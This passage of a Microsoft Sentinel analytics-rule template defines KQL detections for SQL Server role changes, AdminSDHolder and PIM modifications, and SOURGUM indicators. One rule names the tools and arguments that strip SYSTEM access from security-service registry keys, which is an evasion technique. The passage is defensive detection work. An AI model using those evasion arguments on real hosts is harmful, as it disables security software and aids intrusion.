              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CompromisedEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "PublicIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a8048034-fcc3-4c34-b7ec-b50c3d823243')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a8048034-fcc3-4c34-b7ec-b50c3d823243')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User removed from SQL Server Roles",
          "description": "This hunting query identifies user removed from a SQL Server Role.\nThis query is based on the SQLEvent KQL Parser function (link below) \nSQLEvent KQL Parser provided at https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/SQLSever\nDetailed blog post on Monitoring SQL Server with Microsoft Sentinel https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-sql-server-with-azure-sentinel/ba-p/150296",
          "severity": "Medium",
          "enabled": true,
          "query": "\n// SQLEvent is not the table name, it is the function name that should already be imported into your workspace.\n// The underlying table where the data exists is the Event table.\n// This query checks for user removed from a ServerRole\nSQLEvent\n| where Statement has \"Alter Server role\" and Statement has \"drop member\"\n| parse Statement with * \"DROP MEMBER [\" TargetUser:string \"]\" *\n| project TimeGenerated, Computer, Action, ClientIP, CurrentUser, DatabaseName, TargetUser, ObjectName, Statement \n| extend timestamp = TimeGenerated, AccountCustomEntity = CurrentUser, IPCustomEntity = ClientIP  \n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation",
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/fe447f78-5f38-44ef-a69f-7c9ad42cf681')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/fe447f78-5f38-44ef-a69f-7c9ad42cf681')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New User created on SQL Server",
          "description": "This hunting query identifies creation of a new user from SQL Server\nThis query is based on the SQLEvent KQL Parser function (link below) \nSQLEvent KQL Parser provided at https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/SQLSever\nDetailed blog post on Monitoring SQL Server with Microsoft Sentinel https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-sql-server-with-azure-sentinel/ba-p/150296",
          "severity": "Medium",
          "enabled": true,
          "query": "\n// SQLEvent is not the table name, it is the function name that should already be imported into your workspace.\n// The underlying table where the data exists is the Event table.\n// This query checks for new user account created on SQL Server using the SQLEvent() parser\n//\nSQLEvent\n| where Statement has \"Create Login\"\n| parse Statement with \"CREATE LOGIN [\" TargetUser:string \"]\" *\n| project TimeGenerated, Computer, Action, ClientIP, CurrentUser, DatabaseName, TargetUser, ObjectName, Statement\n| extend timestamp = TimeGenerated, AccountCustomEntity = CurrentUser, IPCustomEntity = ClientIP \n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/407a0ebe-b1bd-42c4-9c50-3c08f936bcf2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/407a0ebe-b1bd-42c4-9c50-3c08f936bcf2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User Role altered on SQL Server",
          "description": "This hunting query identifies user role altered on SQL Server\nThis query is based on the SQLEvent KQL Parser function (link below) \nSQLEvent KQL Parser provided at https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/SQLSever\nDetailed blog post on Monitoring SQL Server with Microsoft Sentinel https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-sql-server-with-azure-sentinel/ba-p/150296",
          "severity": "Medium",
          "enabled": true,
          "query": "\n// SQLEvent is not the table name, it is the function name that should already be imported into your workspace.\n// The underlying table where the data exists is the Event table.\n// This query looking for Alter role commands and extracts username which was altered and target objectName\nSQLEvent\n| where Statement contains \"Alter role\" and Statement has \"add member\"\n| parse Statement with * \"ADD MEMBER [\" TargetUser:string \"]\" *\n| project TimeGenerated, Computer, Action, ClientIP, CurrentUser, DatabaseName, TargetUser, ObjectName, Statement\n| extend timestamp = TimeGenerated, AccountCustomEntity = CurrentUser, IPCustomEntity = ClientIP  \n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/53b609ee-d055-4068-86a9-263b6878afad')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/53b609ee-d055-4068-86a9-263b6878afad')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Security Service Registry ACL Modification",
          "description": "Identifies attempts to modify registry ACL to evade security solutions. In the Solorigate attack, the attackers were found modifying registry permissions so services.exe cannot access the relevant registry keys to start the service.\n The detection leverages Security Event as well as MDE data to identify when specific security services registry permissions are modified. \n Only some portions of this detection are related to Solorigate, it also includes coverage for some common tools that perform this activity. \n Reference on guidance for enabling registry auditing:\n - https://docs.microsoft.com/windows/security/threat-protection/auditing/advanced-security-auditing-faq\n - https://docs.microsoft.com/windows/security/threat-protection/auditing/appendix-a-security-monitoring-recommendations-for-many-audit-events\n - https://docs.microsoft.com/windows/security/threat-protection/auditing/audit-registry\n - https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4670\n   - For the event 4670 to be created the audit policy for the registry must have auditing enabled for Write DAC and/or Write Owner\n - https://github.com/OTRF/Set-AuditRule \n - https://docs.microsoft.com/dotnet/api/system.security.accesscontrol.registryrights?view=dotnet-plat-ext-5.0",
          "severity": "High",
          "enabled": true,
          "query": "let servicelist = dynamic(['Services\\\\HealthService', 'Services\\\\Sense', 'Services\\\\WinDefend', 'Services\\\\MsSecFlt', 'Services\\\\DiagTrack', 'Services\\\\SgrmBroker', 'Services\\\\SgrmAgent', 'Services\\\\AATPSensorUpdater' , 'Services\\\\AATPSensor', 'Services\\\\mpssvc']);\nlet filename = dynamic([\"subinacl.exe\",'SetACL.exe']);\nlet parameters = dynamic (['/deny=SYSTEM', '/deny=S-1-5-18', '/grant=SYSTEM=r', '/grant=S-1-5-18=r', 'n:SYSTEM;p:READ', 'n1:SYSTEM;ta:remtrst;w:dacl']);\nlet FullAccess = dynamic(['A;CI;KA;;;SY', 'A;ID;KA;;;SY', 'A;CIID;KA;;;SY']);\nlet ReadAccess = dynamic(['A;CI;KR;;;SY', 'A;ID;KR;;;SY', 'A;CIID;KR;;;SY']);\nlet DenyAccess = dynamic(['D;CI;KR;;;SY', 'D;ID;KR;;;SY', 'D;CIID;KR;;;SY']);\nlet timeframe = 1d;\n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4670\n| where ObjectType == 'Key'\n| where ObjectName has_any (servicelist)\n| parse EventData with * 'OldSd\">' OldSd \"<\" *\n| parse EventData with * 'NewSd\">' NewSd \"<\" *\n| extend Reason = case( (OldSd has ';;;SY' and NewSd !has ';;;SY'), 'System Account is removed', (OldSd has_any (FullAccess) and NewSd has_any (ReadAccess)) , 'System permission has been changed to read from full access', (OldSd has_any (FullAccess) and NewSd has_any (DenyAccess)), 'System account has been given denied permission', 'None')\n| project TimeGenerated, Computer, Account,  ProcessName, ProcessId, ObjectName, EventData, Activity, HandleId, SubjectLogonId, OldSd, NewSd , Reason\n),\n(\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688\n| extend ProcessName = tostring(split(NewProcessName, '\\\\')[-1])\n| where ProcessName in~ (filename) \n| where CommandLine has_any (servicelist) and CommandLine has_any (parameters)\n| project TimeGenerated, Computer, Account, AccountDomain, ProcessName, ProcessNameFullPath = NewProcessName, EventID, Activity, CommandLine, EventSourceName, Type\n),\n(\nWindowsEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4670 and EventData has_any (servicelist) and EventData has 'Key'\n| extend ObjectType = tostring(EventData.ObjectType)\n| where ObjectType == 'Key'\n| extend ObjectName = tostring(EventData.ObjectName)\n| where ObjectName has_any (servicelist)\n| extend OldSd = tostring(EventData.OldSd)\n| extend NewSd = tostring(EventData.NewSd)\n| extend Reason = case( (OldSd has ';;;SY' and NewSd !has ';;;SY'), 'System Account is removed', (OldSd has_any (FullAccess) and NewSd has_any (ReadAccess)) , 'System permission has been changed to read from full access', (OldSd has_any (FullAccess) and NewSd has_any (DenyAccess)), 'System account has been given denied permission', 'None')\n| extend Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n| extend ProcessName = tostring(EventData.ProcessName)\n| extend ProcessId = tostring(EventData.ProcessId)\n| extend Activity= \"4670 - Permissions on an object were changed.\"\n| extend HandleId = tostring(EventData.HandleId)\n| extend  SubjectLogonId = tostring(EventData.SubjectLogonId)\n| project TimeGenerated, Computer, Account,  ProcessName, ProcessId, ObjectName, EventData, Activity, HandleId, SubjectLogonId, OldSd, NewSd , Reason\n),\n(\nWindowsEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688 and EventData has_any (filename) and EventData has_any (servicelist) and EventData has_any (parameters)\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend ProcessName = tostring(split(NewProcessName, '\\\\')[-1])\n| where ProcessName in~ (filename) \n| extend CommandLine = tostring(EventData.CommandLine) \n| where CommandLine has_any (servicelist) and CommandLine has_any (parameters)\n| extend  Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n| extend  AccountDomain = tostring(EventData.AccountDomain)\n| extend  Activity=\"4688 - A new process has been created.\"\n| extend  EventSourceName=Provider\n| project TimeGenerated, Computer, Account, AccountDomain, ProcessName, ProcessNameFullPath = NewProcessName, EventID, Activity, CommandLine, EventSourceName, Type\n),\n(\nDeviceProcessEvents\n| where TimeGenerated >= ago(timeframe)\n| where InitiatingProcessFileName in~ (filename) \n| where InitiatingProcessCommandLine has_any(servicelist) and InitiatingProcessCommandLine has_any (parameters)\n| extend Account = iff(isnotempty(InitiatingProcessAccountUpn), InitiatingProcessAccountUpn, InitiatingProcessAccountName), Computer = DeviceName\n| project TimeGenerated, Computer, Account, AccountDomain, ProcessName = InitiatingProcessFileName, ProcessNameFullPath = FolderPath, Activity = ActionType, CommandLine = InitiatingProcessCommandLine, Type, InitiatingProcessParentFileName\n)\n)\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "473d57e6-f787-435c-a16b-b38b51fa9a4b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4fe5acff-15fc-4278-b596-f2d0e5413e80')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4fe5acff-15fc-4278-b596-f2d0e5413e80')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AdminSDHolder Modifications",
          "description": "This query detects modification in the AdminSDHolder  in the Active Directory which could indicate an attempt for persistence. \nAdminSDHolder Modification is a persistence technique in which an attacker abuses the SDProp process in Active Directory to establish a persistent backdoor to Active Directory.\nThis query searches for the event id 5136 where the Object DN is AdminSDHolder.\nRef: https://attack.stealthbits.com/adminsdholder-modification-ad-persistence",
          "severity": "High",
          "enabled": true,
          "query": "SecurityEvent\n| where EventID == 5136 and EventData contains \"<Data Name=\\\"ObjectDN\\\">CN=AdminSDHolder,CN=System\"\n| parse EventData with * 'ObjectDN\">' ObjectDN \"<\" *\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by Computer, SubjectAccount, SubjectUserSid, SubjectLogonId, ObjectDN",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "52aec824-96c1-4a03-8e44-bb70532e6cea",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SubjectAccount"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f89ce353-5a97-4b46-97d9-c36d124d1de0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f89ce353-5a97-4b46-97d9-c36d124d1de0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Log-Cisco Firewalls not Reporting",
          "description": "Healthcheck on Cisco ASA logs",
          "severity": "High",
          "enabled": true,
          "query": "CommonSecurityLog\n| where DeviceVendor contains \"Cisco\"\n| summarize count()\n",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT30M",
          "triggerOperator": "Equal",
          "triggerThreshold": 0,
          "suppressionDuration": "PT4H",
          "suppressionEnabled": true,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/642b12b7-a041-4192-9999-955b7f526281')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/642b12b7-a041-4192-9999-955b7f526281')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Changes to PIM Settings",
          "description": "PIM provides a key mechanism for assigning privileges to accounts, this query detects changes to PIM role settings.\n  Monitor these changes to ensure they are being made legitimately and don't confer more privileges than expected or reduce the security of a PIM elevation.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n  | where Category =~ \"RoleManagement\"\n  | where OperationName =~ \"Update role setting in PIM\"\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | project-reorder TimeGenerated, OperationName, ResultReason, userPrincipalName, ipAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "0ed0fe7c-af29-4990-af7f-bb5ccb231198",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "userPrincipalName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ipAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4132d264-424d-4b30-abbd-c820b8badef9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4132d264-424d-4b30-abbd-c820b8badef9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SOURGUM Actor IOC - July 2021",
          "description": "Identifies a match across IOC's related to an actor tracked by Microsoft as SOURGUM",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/SOURGUM.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\nlet file_path1 = (iocs | where Type =~ \"filepath1\" | project IoC);\nlet file_path2 = (iocs | where Type =~ \"filepath2\" | project IoC);\nlet file_path3 = (iocs | where Type =~ \"filepath3\" | project IoC);\nlet reg_key = (iocs | where Type =~ \"regkey\" | project IoC);\n(union isfuzzy=true\n(CommonSecurityLog\n| where DestinationHostName has_any (domains) or RequestURL has_any (domains) or Message has_any (domains)\n| parse Message with * '(' DNSName ')' *\n| project TimeGenerated, Message, SourceUserID, RequestURL, DestinationHostName, Type, SourceIP, DestinationIP, DNSName\n| extend  Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, AccountCustomEntity = SourceUserID, UrlCustomEntity = RequestURL , IPCustomEntity = DestinationIP, DNSCustomEntity = DNSName\n),\n(DnsEvents\n| where Name in~ (domains)\n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DNSName = Name, Host = Computer , Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = Host, DNSCustomEntity = DNSName, IPCustomEntity = IPAddresses\n),\n(VMConnection\n| where  RemoteDnsCanonicalNames has_any (domains)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| project TimeGenerated, Computer, Direction, RemoteDnsCanonicalNames, ProcessName, SourceIp, DestinationIp, DestinationPort, DNSName,BytesSent, BytesReceived, RemoteCountry, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIp, HostCustomEntity = Computer, ProcessCustomEntity = ProcessName, DNSCustomEntity = DNSName, Alert = 'SOURGUM IOC detected'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = tostring(EventDetail.[9].[\"#text\"]), DestinationIP = tostring(EventDetail.[14].[\"#text\"]), Image = EventDetail.[4].[\"#text\"]\n| where Image has_any (file_path1) or Image has_any (file_path3)\n| project TimeGenerated, SourceIP, DestinationIP, Image, UserName, Computer, EventDetail, Type\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), HostCustomEntity = Computer , IPCustomEntity = DestinationIP, Alert = 'SOURGUM IOC detected'\n),  \n(DeviceNetworkEvents\n| where (RemoteUrl has_any (domains))  or (InitiatingProcessSHA256 in (sha256Hashes) and InitiatingProcessFolderPath has_any (file_path1)) or InitiatingProcessFolderPath has_any (file_path3)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName,  Alert = 'SOURGUM IOC detected', UrlCustomEntity =RemoteUrl\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallDnsProxy\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with \"DNS Request: \" ClientIP \":\" ClientPort \" - \" QueryID \" \" Request_Type \" \" Request_Class \" \" Request_Name \". \" Request_Protocol \" \" Request_Size \" \" EDNSO_DO \" \" EDNS0_Buffersize \" \" Responce_Code \" \" Responce_Flags \" \" Responce_Size \" \" Response_Duration\n| where Request_Name has_any (domains)\n| extend timestamp = TimeGenerated, DNSName = Request_Name, IPCustomEntity = ClientIP, Alert = 'SOURGUM IOC detected'\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where DestinationHost has_any (domains)  \n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost, Alert = 'SOURGUM IOC detected'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"]\n| where (SHA256 has_any (sha256Hashes) and Image has_any (file_path1)) or (Image has_any (file_path3)) or ( CommandLine has_any (file_path3)) or ( CommandLine has_any (file_path1)) or ( CommandLine has 'reg add' and CommandLine has_any (reg_key) and CommandLine has_any (file_path2)) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source), Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = SHA256\n),\n(DeviceRegistryEvents\n| where RegistryKey has_any (reg_key) and RegistryValueData has_any (file_path2)\n|  project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type \n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  Alert = 'SOURGUM IOC detected'\n),\n(DeviceProcessEvents\n| where  ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3)) or ( InitiatingProcessCommandLine has 'reg add' and InitiatingProcessCommandLine has_any (reg_key) and InitiatingProcessCommandLine has_any (file_path2)) or (InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, FolderPath, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256, Alert = 'SOURGUM IOC detected'\n),\n(DeviceFileEvents\n| where  (InitiatingProcessSHA256 has_any (sha256Hashes) and InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath  has_any (file_path3)) or ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256, FolderPath, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = RequestAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = 